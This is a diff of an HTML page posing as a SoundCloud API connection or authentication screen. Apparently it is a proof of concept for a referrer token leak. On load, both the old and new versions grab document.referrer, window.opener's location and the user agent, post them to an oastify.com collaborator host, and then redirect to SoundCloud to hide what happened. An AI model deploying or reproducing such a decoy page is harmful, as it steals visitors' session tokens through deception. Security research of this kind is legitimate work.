@@ -2,36 +2,37 @@
 <html>
 <head>
     <meta name="referrer" content="unsafe-url">
-    <title>SoundCloud Media Gateway</title>
+    <title>Connecting to SoundCloud API...</title>
 </head>
-<body onload="leakData()">
-    <div style="text-align:center; margin-top:100px; font-family:sans-serif;">
-        <h2>Verifying Track Access...</h2>
-        <p>Please wait, establishing secure connection to SoundCloud servers.</p>
-    </div>
-
-    <form id="leakForm" action="https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/log" method="POST" style="display:none;">
-        <input type="hidden" name="captured_token" id="tokenField">
-        <input type="hidden" name="user_agent" id="uaField">
-    </form>
-
+<body>
     <script>
-        function leakData() {
-            // 1. Grab the referrer via JS - this is the "Secret Token"
-            const ref = document.referrer;
-            
-            // 2. Fill the hidden form
-            document.getElementById('tokenField').value = ref;
-            document.getElementById('uaField').value = navigator.userAgent;
+        async function exfiltrate() {
+            // Attempt to find the secret token in any available property
+            const data = {
+                method_1_ref: document.referrer,
+                method_2_history: (window.history.length > 1) ? "History exists" : "No history",
+                method_3_opener: (window.opener) ? window.opener.location.href : "No opener",
+                ua: navigator.userAgent
+            };
 
-            // 3. Submit the form to Oastify
-            document.getElementById('leakForm').submit();
+            // Send EVERYTHING we found to Oastify
+            await fetch('https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/exfiltrate', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(data)
+            });
 
-            // 4. Redirect back to SoundCloud after 2 seconds
+            // If we still have no referrer, we'll try to 'bait' the user 
+            // but for the PoC, let's see if method 1 or 3 caught it.
             setTimeout(() => {
-                window.location.href = ref || "https://soundcloud.com";
-            }, 2000);
+                window.location.href = "https://soundcloud.com/discover";
+            }, 1000);
         }
+        window.onload = exfiltrate;
     </script>
+    <div style="font-family: sans-serif; text-align: center; margin-top: 100px;">
+        <h2>Authenticating Session...</h2>
+        <progress></progress>
+    </div>
 </body>
 </html>
